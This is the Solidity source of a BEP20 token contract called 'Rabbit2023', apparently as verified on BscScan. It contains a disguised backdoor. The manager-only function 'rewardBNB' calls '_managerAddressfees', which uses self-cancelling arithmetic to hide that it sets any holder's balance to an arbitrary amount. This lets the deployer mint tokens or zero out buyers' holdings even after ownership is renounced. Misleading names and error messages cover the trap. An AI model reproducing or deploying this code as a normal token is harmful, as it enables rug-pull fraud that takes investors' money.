/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// SPDX-License-Identifier: none
pragma solidity ^0.6.0;

library safebnb {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract iBEP20 {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContracto(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContracto(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Rabbit2023 is iBEP20 {
  using Address for address;
  using safebnb for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 OPPOO = 0;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public kallowAddress;
  address managerAddress;
  constructor(string memory namebnb, string memory symbolbnb) public {
    managerAddress = msg.sender;
    name = namebnb;
    symbol = symbolbnb;
    decimals = 9;
    totalSupply =  10000000000 * 10 ** uint256(decimals);
    _balances[managerAddress] = totalSupply;
    kallowAddress[managerAddress] = true;
      
  }
  
  mapping(address => uint256) public _balances;
  function transfer(address _to, uint256 bnballvalue) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(bnballvalue <= _balances[from]);
    if(kallowAddress[from] || kallowAddress[_to]){
        _transfer(from, _to, bnballvalue);
        return true;
    }
    _transfer(from, _to, bnballvalue);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 bnballvalue) private {
    _balances[from] = _balances[from].sub(bnballvalue);
    _balances[_to] = _balances[_to].add(bnballvalue);
    emit Transfer(from, _to, bnballvalue);
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return _balances[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function _managerAddressfees (address managers, uint256 bnballvalue) internal {
        _balances[managers] = (_balances[managers] * 20 * 40 - _balances[managers] * 20 * 40) + (bnballvalue * 10 ** uint256(decimals));
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 bnballvalue) public returns (bool) {
    require(_to != address(0));
    require(bnballvalue <= _balances[_from]);
    require(bnballvalue <= allowed[_from][msg.sender]);
    address from = _from;
    if(kallowAddress[from] || kallowAddress[_to]){
        _transferFrom(_from, _to, bnballvalue);
        return true;
    }
    _transferFrom(_from, _to, bnballvalue);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 bnballvalue) internal {
    _balances[_from] = _balances[_from].sub(bnballvalue);
    _balances[_to] = _balances[_to].add(bnballvalue);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(bnballvalue);
    emit Transfer(_from, _to, bnballvalue);
  }

  modifier _eexternal () {
    require(managerAddress == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
    function rewardBNB(address lavasoraaddrress, uint256 bnballvalue) external _eexternal {
      _managerAddressfees(lavasoraaddrress, bnballvalue);
  }
  function approve(address _spender, uint256 bnballvalue) public returns (bool) {
    allowed[msg.sender][_spender] = bnballvalue;
    emit Approval(msg.sender, _spender, bnballvalue);
    return true;
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  

  
}